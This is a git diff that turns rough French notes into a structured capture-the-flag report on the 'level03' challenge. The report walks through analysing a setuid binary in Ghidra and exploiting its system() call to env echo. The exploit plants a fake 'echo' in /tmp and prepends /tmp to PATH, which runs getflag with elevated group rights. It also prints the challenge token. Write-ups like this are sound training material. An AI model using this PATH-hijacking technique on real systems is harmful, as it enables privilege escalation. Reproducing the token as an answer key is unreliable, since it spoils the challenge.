@@ -1,78 +1,50 @@
+# Rapport CTF - [level03]
 
-ls -la
+## Informations générales
+- **Durée :** [2h]
+- **Équipe :** [vmuller]
+- **Participants :** [Valentin Muller]
 
-nous avons un executable
+## Réalisations
 
-qui si on le lance nous ecrit exploit me 
+1. ### Objectif 1 - Analyse de l'exécutable
+   - **Description :** L'épreuve consistait à analyser un exécutable qui affiche le message "exploit me" lorsqu'il est exécuté.
+   - **Solution :** Les étapes suivantes ont été réalisées :
+     - Exécution de `ls -la` pour lister les fichiers dans le répertoire.
+     - Découverte d'un exécutable.
+     - Exécution de l'exécutable, qui a affiché "exploit me".
+   
+2. ### Objectif 2 - Transfert de l'exécutable vers un serveur Linux
+   - **Description :** Transférer l'exécutable vers un serveur Linux pour une analyse plus approfondie avec Ghidra.
+   - **Solution :** Les étapes suivantes ont été suivies :
+     - Utilisation de la commande `scp` pour transférer l'exécutable depuis la machine de capture vers le serveur Linux.
+     - Commande utilisée : `scp level03 vmuller@192.168.1.21:/home/vmuller`.
 
-donc nous allons l'exploit 
+3. ### Objectif 3 - Analyse de l'exécutable avec Ghidra
+   - **Description :** Analyser l'exécutable avec Ghidra pour examiner le code source ou le code assembleur.
+   - **Solution :** Les étapes suivantes ont été réalisées :
+     - Installation de Ghidra si ce n'était pas déjà fait.
+     - Lancement de `./ghidraRun` et ouverture de Ghidra.
+     - Utilisation de Ghidra pour désassembler le code de l'exécutable.
+     - Identification du code source ou du code assembleur.
 
-pareil que dans l'exo precedant metter le sur votre linux car nous allons devoir utiliser le logiciel GHIDRA
+4. ### Objectif 4 - Découverte de la vulnérabilité
+   - **Description :** Identifier la vulnérabilité dans le code, qui permettra d'exploiter le programme.
+   - **Solution :** Les étapes suivantes ont été effectuées :
+     - Examen du code désassemblé avec Ghidra.
+     - Identification de la ligne `/usr/bin/env echo Exploit me`.
+     - Identification de l'appel système `::system undefined system()`, indiquant que le programme exécute cette commande.
 
-scp level03 vmuller@192.168.1.21:/home/vmuller
+5. ### Objectif 5 - Exploitation de la vulnérabilité
+   - **Description :** Exploiter la vulnérabilité pour exécuter une commande différente.
+   - **Solution :** Les étapes suivantes ont été réalisées :
+     - Création d'un nouveau fichier "echo" dans le répertoire "/tmp" avec la commande `echo whoami > /tmp/echo`.
+     - Attribution des autorisations nécessaires au fichier "echo".
+     - Modification du chemin d'accès avec `export PATH=/tmp:$PATH` pour donner la priorité au répertoire "/tmp".
+     - Exécution de l'exécutable "level03" avec `./level03` pour constater qu'il appartient au groupe "flag03".
+     - Modification du fichier "echo" pour exécuter `getflag` avec `echo getflag > /tmp/echo`.
+     - Exécution de "level03" à nouveau pour obtenir le token : "qi0maab88jeaj46qoumi7maus".
 
-install ghidra si vous ne l'avez pas
-
-lancer le ./ghidraRun
-
-cliquer sur la tete de dragon "CodeBrowser"
-
-une fois fait gliser votre executable a l'interieur 
-
-nous avons du code en asm
-
-on vas desasembler le code pour voir ce quil fait 
-
-(ou pour voir le code en c = ctrl + e sur le main)
-
-pour ca clic droit sur le main: desassemble
-
-nous pouvon voir cette phrase 
-
-"/usr/bin/env echo Exploit me"
-
-et cette phrase juste en dessous
-
-CALL       <EXTERNAL>::system                               undefined system()
-
-ca veux dire que le programme fait un appel systheme a une et fait cette commade : "/usr/bin/env echo Exploit me"
-
-c'est genial ca car ils utilisent le env pour pouvoir utiliser echo 
-
-nous pouvons donc rediriger le env vers une autre commande echo que nous avons coder nous meme 
-
-pour ce faire direction le tmp car c'est le seul endrois ou nous pouvons créer des fichier 
-
-cd /tmp
-
-echo whoami > echo
-
-noublier pas de donner les permition au nouveau echo
-
-pour l'instant nous voulons voir quel drois a le programme level03
-
-changer le PATH
-
-export PATH=/tmp:$PATH
-
-comme ca le path sera toujours accesible mais le /tmp sera priviliger
-
-cd 
-
-./level03
-
-et oh tien il a appartien au groupe flag03
-
-on vas donc ganger notre echo pour lui donner une meilleur commande 
-
-cd /tmp
-
-echo getflag > echo
-
-cd 
-
-./level03
-
-merci pour le token !
-
-Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+## Réflexions finales
+- **Expérience globale :** L'épreuve liée à level03 a été une expérience de débogage intéressante qui a nécessité des compétences en analyse de code et en exploitation de vulnérabilités.
+- **Leçons apprises :** J'ai acquis de nouvelles compétences en analysant le code avec Ghidra et en exploitant une vulnérabilité pour exécuter des commandes.
